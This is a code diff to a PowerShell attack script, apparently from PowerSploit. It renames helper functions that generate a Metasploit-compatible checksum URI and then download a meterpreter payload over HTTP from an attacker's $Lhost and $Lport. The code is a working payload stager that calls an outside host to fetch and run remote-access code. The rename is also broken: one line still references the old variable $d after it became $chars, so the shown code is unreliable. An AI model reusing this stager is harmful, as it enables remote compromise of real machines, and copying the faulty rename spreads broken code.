@@ -590,24 +590,24 @@ http://www.exploit-monday.com
             }
         }
        
-	$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+	$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
 	$x = ""
-		function c($v){
+		function sum($v){
 		  return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)
 		}
 		
-		function t{
-		  $f = "";1..3 | foreach-object {$f+= $d[(Get-Random -maximum $d.Length)]};
+		function RandomChars{
+		  $f = "";1..3 | foreach-object {$f+= $chars[(Get-Random -maximum $chars.Length)]};
 		  return $f;
 		}
 		
-		function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
+		function RandomArray { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
 		
-		function g{
+		function Generate{
 		for ($i=0; $i -lt 64; $i++){
-		    $h = t;$k = $d | e; 
+		    $h = RandomChars;$k = $d | RandomArray; 
 			foreach ($l in $k){
-			    $s = $h + $l; if (c($s)){ 
+			    $s = $h + $l; if (sum($s)){ 
 				return $s}
 			     }
 				return "9vXU";
@@ -615,9 +615,9 @@ http://www.exploit-monday.com
 		}
 
 	
-	       $n = g; 
-        $Request = "http$($SSL)://$($Lhost):$($Lport)/$n"
-	       Write-Verbose "Requesting meterpreter payload from $Request"
+	    $GeneratedURI = Generate; 
+        $Request = "http$($SSL)://$($Lhost):$($Lport)/$GeneratedURI"
+	    Write-Verbose "Requesting meterpreter payload from $Request"
         $Uri = New-Object Uri($Request)
         $WebClient = New-Object System.Net.WebClient
         $WebClient.Headers.Add('user-agent', "$UserAgent")
